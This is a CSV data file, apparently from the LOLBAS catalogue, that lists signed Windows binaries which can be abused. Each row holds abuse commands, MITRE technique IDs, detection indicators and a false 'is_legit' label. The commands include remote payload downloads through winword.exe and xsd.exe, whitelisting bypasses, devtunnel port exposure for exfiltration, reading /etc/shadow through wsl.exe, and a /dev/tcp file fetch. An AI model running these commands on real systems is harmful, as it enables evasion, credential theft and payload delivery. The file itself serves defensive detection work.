"Name","Description","Author","Created","Commands","Commands_Command","Commands_Description","Commands_Usecase","Commands_Category","Commands_Privileges","Commands_MitreID","Commands_OperatingSystem","Commands_Tags","Commands_Tags_Download","Full_Path","Full_Path_Path","Detection","Detection_IOC","Acknowledgement","Acknowledgement_Person","Acknowledgement_Handle","Commands_Tags_Execute","Resources","Resources_Link","Code_Sample","Code_Sample_Code","Detection_Sigma","Detection_Analysis","Detection_BlockRule","Commands_Tags_Requires","Commands_Tags_Input","Detection_Splunk","Detection_Elastic","Aliases","Aliases_Alias","Commands_Tags_Application","Commands_Tags_Type","is_legit"
"xsd.exe","XML Schema Definition Tool included with the Windows Software Development Kit (SDK).","Avihay Eldad","2024-04-09","","xsd.exe {REMOTEURL}","Downloads payload from remote server","It will download a remote payload and place it in INetCache","Download","User","T1105","Windows","","INetCache","","C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\bin\NETFX <version> Tools\xsd.exe","","[''URL on a xsd.exe command line''-|-''xsd.exe making unexpected network connections or DNS requests'']","","Avihay Eldad","@AvihayEldad","","","","","","","","","","","","","","","","","false"
"winfile.exe","Windows File Manager executable","Avihay Eldad","2024-04-30","","winfile.exe {PATH:.exe}","Execute an executable file with WinFile as a parent process.","Performs execution of specified file, can be used as a defense evasion","Execute","User","T1202","Windows 10, Windows 11","","","","[''C:\Windows\System32\winfile.exe''-|-''C:\Windows\winfile.exe''-|-''C:\Program Files\WinFile\winfile.exe''-|-''C:\Program Files (x86)\WinFile\winfile.exe''-|-''C:\Program Files\WindowsApps\Microsoft.WindowsFileManager_10.3.0.0_x64__8wekyb3d8bbwe\WinFile\winfile.exe'']","","","","Avihay Eldad","@AvihayEldad","EXE","","https://github.com/microsoft/winfile","","","","","","","","","","","","","","false"
"vstest.console.exe","VSTest.Console.exe is the command-line tool to run tests","Onat Uzunyayla","2023-09-08","","vstest.console.exe {PATH:.dll}","VSTest functionality may allow an adversary to executes their malware by wrapping it as a test method then build it to a .exe or .dll file to be later run by vstest.console.exe. This may both allow AWL bypass or defense bypass in general","Proxy Execution and AWL bypass, Adversaries may run malicious code embedded inside the test methods of crafted dll/exe","AWL Bypass","User","T1127","Windows 10, Windows 11","","","","[''C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TestWindow\vstest.console.exe''-|-''C:\Program Files (x86)\Microsoft Visual Studio\2022\TestAgent\Common7\IDE\CommonExtensions\Microsoft\TestWindow\vstest.console.exe'']","","vstest.console.exe spawning unexpected processes","","[''Onat Uzunyayla''-|-''Ayberk Halac'']","","DLL","","https://learn.microsoft.com/en-us/visualstudio/test/vstest-console-options?view=vs-2022","","https://github.com/onatuzunyayla/vstest-lolbin-example/","","","","","","","","","","","","false"
"vsls-agent.exe","Agent for Visual Studio Live Share (Code Collaboration)","Jimmy (@bohops)","2022-11-01","","vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll}","Load a library payload using the --agentExtensionPath parameter (32-bit)","Execute proxied payload with Microsoft signed binary","Execute","User","T1218","Windows 10 21H2 (likely previous and newer versions with modern versions of Visual Studio installed)","","","","c:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\Common7\IDE\Extensions\Microsoft\LiveShare\Agent\vsls-agent.exe","","","","Jimmy","@bohops","DLL","","https://twitter.com/bohops/status/1583916360404729857","","","https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_vslsagent_agentextensionpath_load.yml","","","","","","","","","","","false"
"devtunnel.exe","Binary to enable forwarded ports on windows operating systems.","Kamran Saifullah","2023-09-16","","devtunnel.exe host -p 8080","Enabling a forwarded port for locally hosted service at port 8080 to be exposed on the internet.","Download Files, Upload Files, Data Exfiltration","Download","User","T1105","Windows 10, Windows 11, MacOS","","","","[''C:\Users\<username>\AppData\Local\Temp\.net\devtunnel\devtunnel.exe''-|-''C:\Users\<username>\AppData\Local\Temp\DevTunnels\devtunnel.exe'']","","[''devtunnel.exe binary spawned''-|-''*.devtunnels.ms''-|-''*.*.devtunnels.ms'']","","Kamran Saifullah","@deFr0ggy","","","https://code.visualstudio.com/docs/editor/port-forwarding","","","[''https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/dns_query/dns_query_win_devtunnels_communication.yml''-|-''https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/network_connection/net_connection_win_domain_devtunnels.yml'']","https://cydefops.com/vscode-data-exfiltration","","","","","","","","","","false"
"XBootMgrSleep.exe","Windows Performance Toolkit binary used for tracing and analyzing system performance during sleep and resume transitions.","Avihay Eldad","2024-06-13","","xbootmgrsleep.exe 1000 {PATH:.exe}","Execute executable via XBootMgrSleep, with a 1 second (=1000 milliseconds) delay. Alternatively, it is also possible to replace the delay with any string for immediate execution.","Performs execution of specified executable, can be used as a defense evasion","Execute","User","T1202","Windows","","","","[''C:\Program Files\Windows Kits\10\Windows Performance Toolkit\xbootmgrsleep.exe''-|-''C:\Program Files (x86)\Windows Kits\10\Windows Performance Toolkit\xbootmgrsleep.exe'']","","","","[''Avihay Eldad''-|-''Yuval Saban'']","[''@AvihayEldad''-|-''@yuvalsaban3'']","EXE","","https://learn.microsoft.com/en-us/previous-versions/windows/desktop/xperf/reference","","","","","","","","","","","","","","false"
"Wsl.exe","Windows subsystem for Linux executable","Matthew Brown","2019-06-27","","[''wsl.exe -e /mnt/c/Windows/System32/calc.exe''-|-''wsl.exe -u root -e cat /etc/shadow''-|-''wsl.exe --exec bash -c ""{CMD}""''-|-''wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary''']","[''Executes calc.exe from wsl.exe''-|-''Cats /etc/shadow file as root''-|-''Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u <username>`) on the default WSL distro (unless stated otherwise using `-d <distro name>`)''-|-''Downloads file from 192.168.1.10'']","[''Performs execution of specified file, can be used to execute arbitrary Linux commands.''-|-''Performs execution of arbitrary Linux commands as root without need for password.''-|-''Performs execution of arbitrary Linux commands.''-|-''Download file'']","[''Execute''-|-''Execute''-|-''Execute''-|-''Download'']","[''User''-|-''User''-|-''User''-|-''User'']","[''T1202''-|-''T1202''-|-''T1202''-|-''T1105'']","[''Windows 10, Windows Server 2019, Windows 11''-|-''Windows 10, Windows Server 2019, Windows 11''-|-''Windows 10, Windows Server 2019, Windows 11''-|-''Windows 10, Windows Server 2019, Windows 11'']","","","","C:\Windows\System32\wsl.exe","","Child process from wsl.exe","","[''Alex Ionescu''-|-''Matt''-|-''Asif Matadar''-|-''Nasreddine Bencherchali''-|-''Konrad 'unrooted' Klawikowski'']","[''@aionescu''-|-''@NotoriousRebel1''-|-''@d1r4c''-|-''@nas_bench'']","[''EXE''-|-''CMD''-|-''CMD'']","","[''https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules''-|-''https://twitter.com/nas_bench/status/1535431474429808642'']","","","https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_wsl_lolbin_execution.yml","","https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules","","","","","","","","","false"
"Winword.exe","Microsoft Office binary","Reegun J (OCBC Bank)","2019-07-19","","winword.exe {REMOTEURL}","Downloads payload from remote server","It will download a remote payload and place it in INetCache.","Download","User","T1105","Windows","","INetCache","","[''C:\Program Files\Microsoft Office\root\Office16\winword.exe''-|-''C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\winword.exe''-|-''C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\winword.exe''-|-''C:\Program Files (x86)\Microsoft Office\Office16\winword.exe''-|-''C:\Program Files\Microsoft Office\Office16\winword.exe''-|-''C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\winword.exe''-|-''C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\winword.exe''-|-''C:\Program Files (x86)\Microsoft Office\Office15\winword.exe''-|-''C:\Program Files\Microsoft Office\Office15\winword.exe''-|-''C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\winword.exe''-|-''C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\winword.exe''-|-''C:\Program Files (x86)\Microsoft Office\Office14\winword.exe''-|-''C:\Program Files\Microsoft Office\Office14\winword.exe''-|-''C:\Program Files (x86)\Microsoft Office\Office12\winword.exe''-|-''C:\Program Files\Microsoft Office\Office12\winword.exe''-|-''C:\Program Files\Microsoft Office\Office12\winword.exe'']","","Suspicious Office application Internet/network traffic","","Reegun J (OCBC Bank)","@reegun21","","","[''https://twitter.com/reegun21/status/1150032506504151040''-|-''https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191'']","","","https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_office_arbitrary_cli_download.yml","","","","","","","","","","","false"
"WinProj.exe","Microsoft Project Executable","Avihay Eldad","2024-02-14","","WinProj.exe {REMOTEURL}","Downloads payload from remote server","It will download a remote payload and place it in INetCache.","Download","User","T1105","Windows","","INetCache","","[''C:\Program Files (x86)\Microsoft Office\Office14\WinProj.exe''-|-''C:\Program Files\Microsoft Office\Office14\WinProj.exe''-|-''C:\Program Files (x86)\Microsoft Office\Office15\WinProj.exe''-|-''C:\Program Files\Microsoft Office\Office15\WinProj.exe''-|-''C:\Program Files (x86)\Microsoft Office\Office16\WinProj.exe''-|-''C:\Program Files\Microsoft Office\Office16\WinProj.exe''-|-''C:\Program Files (x86)\Microsoft Office\root\Office14\WinProj.exe''-|-''C:\Program Files\Microsoft Office\root\Office14\WinProj.exe''-|-''C:\Program Files (x86)\Microsoft Office\root\Office15\WinProj.exe''-|-''C:\Program Files\Microsoft Office\root\Office15\WinProj.exe''-|-''C:\Program Files (x86)\Microsoft Office\root\Office16\WinProj.exe''-|-''C:\Program Files\Microsoft Office\root\Office16\WinProj.exe'']","","[''URL on a WinProj command line''-|-''WinProj making unexpected network connections or DNS requests'']","","Avihay Eldad","@AvihayEldad","","","","","","","","","","","","","","","","","false"
"Wfc.exe","The Workflow Command-line Compiler tool is included with the Windows Software Development Kit (SDK).","Jimmy (@bohops)","2021-09-26","","wfc.exe {PATH_ABSOLUTE:.xoml}","Execute arbitrary C# code embedded in a XOML file.","Execute proxied payload with Microsoft signed binary to bypass WDAC policies","AWL Bypass","User","T1127","Windows 10 2004 (likely previous and newer versions as well)","","","","C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\wfc.exe","","As a Windows SDK binary, execution on a system may be suspicious","","[''Matt Graeber''-|-''Jimmy'']","[''@mattifestation''-|-''@bohops'']","XOML","","https://bohops.com/2020/11/02/exploring-the-wdac-microsoft-recommended-block-rules-part-ii-wfc-fsi/","","https://bohops.com/2020/11/02/exploring-the-wdac-microsoft-recommended-block-rules-part-ii-wfc-fsi/","https://github.com/SigmaHQ/sigma/blob/6b34764215b0e97e32cbc4c6325fc933d2695c3a/rules/windows/process_creation/proc_creation_win_lolbin_wfc.yml","","https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules","","","","","","","","","false"
